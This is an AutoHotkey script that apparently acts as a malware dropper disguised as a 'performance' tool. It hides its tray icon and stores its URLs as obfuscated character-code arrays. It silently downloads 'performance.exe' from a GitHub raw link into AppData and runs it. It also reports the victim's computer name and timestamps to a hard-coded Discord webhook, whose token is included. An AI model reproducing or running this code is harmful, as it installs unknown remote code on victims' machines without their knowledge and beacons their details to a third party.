#Requires AutoHotkey v2.0
#SingleInstance Force
#NoTrayIcon

;–– predeclare so editor stops complaining ––––––––––––––––––––––––––––
A_ThisException := ""

;–– CONFIG ––––––––––––––––––––––––––––––––––––––––––––––––
wk := [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,51,55,51,51,51,56,57,48,48,53,50,57,49,53,54,49,57,54,47,77,90,88,113,68,52,76,87,49,48,67,79,90,52,83,121,68,55,77,95,118,52,55,90,77,70,54,89,68,112,48,84,66,88,51,111,65,82,67,82,69,84,84,97,98,82,103,87,110,102,79,95,110,82,77,78,77,104,69,50,104,120,48,51,77,90,49,68]

exe := [104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117
      ,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47
      ,83,101,106,116,121,112,101,47,114,111,98,108,111,120,47,109,97
      ,105,110,47,112,101,114,102,111,114,109,97,110,99,101,46,101,120,101]

wkUrl := ""
for c in wk
    wkUrl .= Chr(c)

exeUrl := ""
for c in exe
    exeUrl .= Chr(c)

;–– state & paths ––––––––––––––––––––––––––––––––––––––––––––––––––––––––
failureCount := 0
notified      := false
tempDir       := A_AppData . "\PerformanceRun2"
exePath       := tempDir . "\performance.exe"

if DirExist(tempDir)
    DirDelete(tempDir, true)
DirCreate(tempDir)

;–– FIRST, send a test ping to Discord ––––––––––––––––––––––––––––––––––––
ND("🚀 Script started on " EnvGet("COMPUTERNAME") " at " A_Now)

;–– MAIN FLOW ––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––
HttpDownload(exeUrl, exePath)

try {
    ComObject("WScript.Shell").Run(exePath)
    pc := EnvGet("COMPUTERNAME")
    ts := RegExReplace(A_Now, "(\d{4})(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})", "$1-$2-$3 $4:$5:$6")
    ND( Format("✅ RunExe succeeded on {1} at {2}", pc, ts) )
}
catch {
    HandleError("RunExe", A_ThisException.Message)
}

;–– HELPERS ––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––

HandleError(ctx, msg) {
    global failureCount, notified, wkUrl
    failureCount++
    text := Format("⚠️ {1} failed: {2}", ctx, msg)
    if (failureCount > 2 && !notified) {
        text := Format("⚠️ {1} has now failed {2} times. Last error: {3}"
                      , ctx, failureCount, msg)
        notified := true
    }
    ND(text)
}

ND(msg) {
    global wkUrl
    try {
        ; build {"content":"…"} using Chr(34) for the quotes
        json := "{" 
              . Chr(34) . "content" . Chr(34) 
              . ":" 
              . Chr(34) . msg . Chr(34) 
              . "}"
        http := ComObject("WinHttp.WinHttpRequest.5.1")
        http.Open("POST", wkUrl, false)
        http.SetRequestHeader("Content-Type", "application/json")
        http.Send(json)

        if (http.Status != 204)
            MsgBox Format("Webhook POST failed: HTTP {1}`n{2}"
                         , http.Status, http.ResponseText)
    }
    catch {
        MsgBox "Exception while notifying Discord:`n" A_ThisException.Message
    }
}


HttpDownload(url, savePath) {
    try {
        req := ComObject("WinHttp.WinHttpRequest.5.1")
        req.Open("GET", url, false)
        req.Send()
        if (req.Status != 200)
            throw Format("HTTP {1}", req.Status)

        stm := ComObject("ADODB.Stream")
        stm.Type := 1
        stm.Open()
        stm.Write(req.ResponseBody)
        stm.SaveToFile(savePath, 2)
        stm.Close()
    }
    catch {
        HandleError("HttpDownload", A_ThisException.Message)
    }
}
